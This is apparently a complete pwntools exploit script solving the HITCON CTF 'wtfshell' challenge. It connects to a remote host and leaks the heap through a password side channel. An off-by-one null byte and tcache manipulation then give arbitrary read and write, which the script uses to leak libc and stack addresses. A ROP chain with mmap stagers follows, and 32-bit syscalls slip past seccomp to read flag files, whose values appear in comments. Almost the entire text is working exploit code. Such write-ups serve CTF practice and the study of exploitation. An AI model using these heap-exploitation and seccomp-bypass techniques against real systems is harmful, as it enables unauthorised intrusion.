from pwn import *
#context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'split-window', '-h']

TARGET = './wtfshell'
HOST = '35.194.252.171'
PORT = 42531

elf = ELF(TARGET)
def start():
	if not args.R:
		print("local")
		#return process(["./ld-linux-x86-64.so.2", TARGET], env={"LD_LIBRARY_PATH":"./"}, aslr=False)
		return process(["./ld-linux-x86-64.so.2", TARGET], env={"LD_LIBRARY_PATH":"./"})
	else:
		print("remote")
		return remote(HOST, PORT)

def get_base_address(proc):
	lines = open("/proc/{}/maps".format(proc.pid), 'r').readlines()
	for line in lines :
		if TARGET[2:] in line.split('/')[-1] :
			break
	return int(line.split('-')[0], 16)

def debug(proc, breakpoints):
	script = "handle SIGALRM ignore\n"
	PIE = get_base_address(proc)
	script += "set $base = 0x{:x}\n".format(PIE)
	for bp in breakpoints:
		script += "b *0x%x\n"%(PIE+bp)
	script += "c"
	gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))

r = start()
PRN = b"\xe2\x88\x9a "
TIMEOUT = 1

# ----file----
# create new file
def nsfw(name, perm):
	r.sendlineafter(PRN, f'nsfw,{name},{perm}'.encode())

# write data to file
def wtf(name, data):
	if isinstance(name, str) and isinstance(data, str):
		r.sendlineafter(PRN, f'wtf,{data},{name}'.encode())
	else:
		r.sendlineafter(PRN, b'wtf,'+data+b','+name)

# output file
def omfg(name):
	r.sendlineafter(PRN, f'omfg,{name}'.encode())

# remove file 
def gtfo(name):
	r.sendlineafter(PRN, f'gtfo,{name}'.encode())

# redirect to file
def rip(name, data):
	if isinstance(name, str):
		r.sendlineafter(PRN, f'rip,{name}'.encode())
	else:
		r.sendlineafter(PRN, b'rip,'+name)
	if isinstance(data, str):
		r.sendline(data.encode())
	else:
		r.sendline(data)

# ----user----
# create new user
def stfu(name):
	r.sendlineafter(PRN, f'stfu,{name}'.encode())

# change password
def asap(name, password):
	r.sendlineafter(PRN, f'asap,{name}'.encode())
	r.sendlineafter(b'password:', password)
	r.sendlineafter(b'password:', password)

# ----other---
# reset all
def reset():
	r.sendlineafter(PRN, b'irl')
def leak_heap():
	leak = b'\x80'
	stfu('abcd')
	stfu('ABCD')
	def search_range(pw, arr):
		for i in arr:
			if i == 0 or i == 0xa:
				continue
			r.sendlineafter(PRN, b'asap,ABCD')
			r.sendlineafter(b'password:', b'a'*0x40)
			r.sendafter(b'password:', b'a'*0x40+pw+i.to_bytes(1, 'little'))
			r.sendline(b'')
			ret = r.recvuntil(b'pw1', timeout=TIMEOUT)
			if len(ret) == 0:
				r.sendline(b'\x00')
				break
			r.sendline(b'')
		return i.to_bytes(1, 'little')
	with log.progress('Trying to leak heap') as p:
		p.status('0/5')
		leak += search_range(leak, [x for x in range(8, 0x108, 0x10)]) 
		assert leak[:-1] != b'\x18', "bad luck" 
		p.status('1/5')
		leak += search_range(leak, [x for x in range(0x100)]) 
		p.status('2/5')
		leak += search_range(leak, [x for x in range(0x100)]) 
		p.status('3/5')
		leak += search_range(leak, [x for x in range(0x100)]) 
		p.status('4/5')
		leak += search_range(leak, [x for x in range(0x55, 0x58)]) 
		p.success('done')
	return u64(leak.ljust(8, b'\x00'))

def write_with_null(name, data):
	filled = data.replace(b'\x00', b'\x01')
	wtf(name, filled)
	for i in range(len(data)):
		if data[len(data)-1-i] == 0:
			wtf(name, filled[:len(data)-1-i])

leak = leak_heap()
dbg('leak')

heap = leak - 0x880
dbg('heap')
for i in range(9):
	nsfw(str(i), 3)
nsfw('x', 3)

# create super big chunk to consolidate
fake_chunk = heap + 0x1ce0
payload = b''
payload += b'a'*0x28
payload += flat(0x1171, fake_chunk-0x10, fake_chunk-0x10)
payload += flat(0,0,0,0)
filled = payload.replace(b'\x00', b'\x01')

# fill 0x400 sized tcache
# #0-#6 --> 3f8
# prepare fake file struct under #3
for i in range(7):
	for j in range(4):
		rip(str(i), str(i)*0xff)
	if i == 3:
		nsfw('victim', 3)
		rip('victim', filled)
		nsfw('fake', 3)
		write_with_null(b'victim', payload)
rip('victim', b'v'*0x70)

# create 0x830 sized null terminated chunk
# 0x830 --> 0x400 for new gbuff, 0x420 for victim)
# #7 --> 0x831
for i in range(8):
	rip(b'7', (b'\x70\x11//////'*(0x100//8))[:-1])
	rip(b'7', b'/')
rip('7', '7'*0x20)

# sep
nsfw('sep', 3)

# #8 --> 3e8
nsfw('8', 3)
for i in range(3):
	rip('8', '8'*0xff)
rip('8', '8'*0xef)

# #9 --> 3f8
nsfw('9', 3)
for i in range(4):
	rip('9', '9'*0xff)

# sep
nsfw('stop', 3)

# free #7 --> free 0x830 sized chunk
# #7 --> 0x931
rip('7', '7'*0xff)
gtfo('7')

# #8 for 0x400 sized padding
# #8 --> 3f8
rip('8', '8'*0xf)
# #9 --> 408
rip('9', '9'*0xf)

# fill 0x410 sized tcache list
# #1-#5 --> 4f8
for i in range(1, 6):
	rip(str(i), str(i)*0xff)
# #8 --> 4f8
rip('8', '8'*0xff)

# fill 0x410 sized tcache list to 7
# #9 --> 5f8
rip('9', '9'*0xff)

# now 0x400 tcache is full and our fake chunk is filled 
#0x5555558f0cd0: 0x6161616161616161      0x0000000000001171
#0x5555558f0ce0: 0x00005555558f0cd0      0x00005555558f0cd0 <-- fake chunk points to itself

#...

#0x5555558f1a30: 0x0000000000000000      0x0000000000000411
#0x5555558f1a40: 0x0000555000da4981      0xb9906d5ef77f5f04 <-- top of 0x410 sized tcache

#...

#0x5555558f1e40: 0x2f2f2f2f2f2f1170      0x0000000000000421 <-- aligne to 0x4"21" chunk header

# this reset will free gbuff --> link to unsortedbin
# gbuff alloc --> alloc our filled chunk from top of tcache
## xmalloc won't clear our last 8byte.
reset()

nsfw('aaaa', 3)
for i in range(4):
	rip('aaaa', b'a'*0xff)

# try to get chunks adjacent of gbuff
## this chunk size is 0x120 (header is 0x121)
nsfw('bbbb', 3)
payload = b''
payload += b'b'*0xf8
payload += p64(0x31)
payload = payload.ljust(0x10f, b'b')
write_with_null(b'bbbb', payload)

# fill 0x100 sized tcache list for consolidation
for i in range(7):
	nsfw(chr(i+0x41), 3)
	rip(chr(i+0x41), chr(i+0x41)*0xef)
# sep
nsfw('---', 3)
for i in range(7):
	rip(chr(i+0x41), chr(i+0x41)*0xef)

# trigger off-by-one null
r.sendafter(PRN, b'rip,xxxx'+b'c'*0x3f8)
r.recvuntil(b'rip:')

if args.D:
	debug(r, [0x27de, 0x2804])
# backword consolidate
gtfo('bbbb')
log.info('1/16?')
gtfo('F')
log.info('passed!')
nsfw('F',3)
gtfo('E')
nsfw('a'*0x18,3)
# now our fake file is ready
# 0x55555655ec60: 0x0000000000000000      0x0000000000000021
# 0x55555655ec70: 0x000055555655ec90      0x000055555655ece0 <-- name ptr to 'F', data ptr to heap+0x1ce0
# 0x55555655ec80: 0x0000000300000000      0x0000000000000021
# 0x55555655ec90: 0x0000555003000046      0x0000000000000000 <-- filename 'F'
# 0x55555655eca0: 0x0000000000000000      0x0000000000000071
# 0x55555655ecb0: 0x000000055555655e      0xb7f44793869eed9d
# 0x55555655ecc0: 0x6161616161616161      0x6161616161616161
# 0x55555655ecd0: 0x6161616161616161      0x0000000000000061
# 0x55555655ece0: 0x3131313131313131      0x3131313131313131 <-- heap+0x1ce0
# 0x55555655ecf0: 0x3131313131313131      0x3131313131313131
# 0x55555655ed00: 0x3131313131313131      0x3131313131313131
# 0x55555655ed10: 0x3131313131313131      0x3131313131313131
# 0x55555655ed20: 0x000055555655d341      0x000055555655d360 <-- fake file struct : name ptr to 'lag1', data ptr to heap+0x360 = flag1
#                                               ^^^^^^^^^^^^ <-- we got AAR/W by editing here.
# 0x55555655ed30: 0x0000000300000000      0x0000000000001211
# 0x55555655ed40: 0x00007fcccae7ecc0      0x00007fcccae7ecc0 <-- our unsortedbin chunk

def aar(where):
	payload = b''
	payload += b'1'*0x40+flat(heap+0x341, where)
	write_with_null(b'F', payload)
	omfg('lag1')

def aaw(where, what):
	payload = b''
	payload += b'1'*0x40+flat(heap+0x341, where)
	write_with_null(b'F', payload)
	write_with_null(b'lag1', what)

# get flag1
aar(heap+0x360)  
flag1 = r.recvuntil(b'}')

# leak libc
aar(heap+0xac8)
leak = u64(r.recvuntil(b'\n', True).ljust(8, b'\x00'))
dbg('leak')
base = leak - 0x1f6cc0
environ = base + 0x1fe320
dbg('base')

# leak stack
aar(environ)
stack = u64(r.recvuntil(b'\n', True).ljust(8, b'\x00'))
dbg('stack')

# ready for rop
rax = base + 0x00189a6a
rbx = base + 0x0019a433
rcx = base + 0x00120cde
rdx = base + 0x00165f32
rsi = base + 0x0016e835
rdi = base + 0x0019a6fa
r8 = base + 0x0008c27e
syscall = base + 0x001398ab
p5 = base + 0x0019a6f3

# for clear r9
shr_r9 = base + 0x0005088b #0x0005088b: shr r9, cl; mov [rdi+0x10], r9; ret;

# we can't set r10 easily, so we use rcx and call mmap instead
mmap = base + 0x116ba0

# this is where ret addr from cmd_wtf will be stored
target = stack - 0x150

# let the 0xf0 sized tcache ptr to stack
aaw(heap+0x100, p64(target+0x8+0x20)[:6]) # +0x20 for saving our payload from cmd_wtf

# we want cmd_wtf to use strdup instead of realloc, so just clear the pointer
payload = b''
payload += b'1'*0x40+flat(heap+0x341, 0)
write_with_null(b'F', payload)

# send first stager to stack
payload = b''
payload += flat(rdi, 0, rsi, target+0x70, rdx, 0x200, rax, 0, syscall)
payload = payload.ljust(0xee, b'a')
write_with_null(b'lag1', payload)


# overwrite ret addr from cmd_wtf --> jump to first stager
aaw(target, p64(p5)[:6])

# build second stager (mmap + read ops)
payload = b''

# clear r9 ( the value of r9 very depends on environment. )
payload += flat(rdi, target, rcx, 63, shr_r9)

# create 32bit rw, wx region
payload += flat(rdi, 0xdead000, rsi, 0x1000, rdx, 3, rcx, 0x22, r8, -1, mmap)
payload += flat(rdi, 0xbeef000, rsi, 0x1000, rdx, 6, rcx, 0x22, r8, -1, mmap)

# second stager
payload += flat(rdi, 0, rsi, 0xbeef000, rdx, 0x100, rax, 0, syscall)
payload += flat(rdi, 0, rsi, 0xdead000, rdx, 0x100, rax, 0, syscall)
payload += flat(0xbeef000)
payload = payload.ljust(0x200, b'\x00')
r.send(payload)

# final payload for wx region
# 32bit system calls for bypass seccomp
payload = b''
payload += asm('''
	mov ebx, 3;
	mov ecx, 0xdead000
	xor edx, edx
	xor esi, esi
	mov eax, 0x127
	int 0x80
	mov ebx, eax
	mov ecx, 0xdead100
	xor edx, 0xff
	mov eax, 0x3
	int 0x80
''', arch = 'i386', bits=32)
payload += asm('''
	mov rax, 0x14
	mov rdi, 1
	mov rsi, 0xdead080
	mov rdx, 1
	syscall
	xor rax, rax
''', arch = 'amd64', bits=64)
payload = payload.ljust(0x100, b'\x00')
r.send(payload)

# final payload for rw region
payload = b''
payload += b'/proc/self/cwd/flag2\x00'
payload = payload.ljust(0x80, b'\x00')
payload += flat(0xdead100, 0xff)
payload = payload.ljust(0x100, b'\x00')
r.send(payload)
flag2 = r.recvuntil(b'}')
print("flag1:", flag1)
print("flag2:", flag2)

#hitcon{just_a_rootimentary_challenge}
#hitcon{escape_seccomp_hell_through_heavens_gate}

r.interactive()

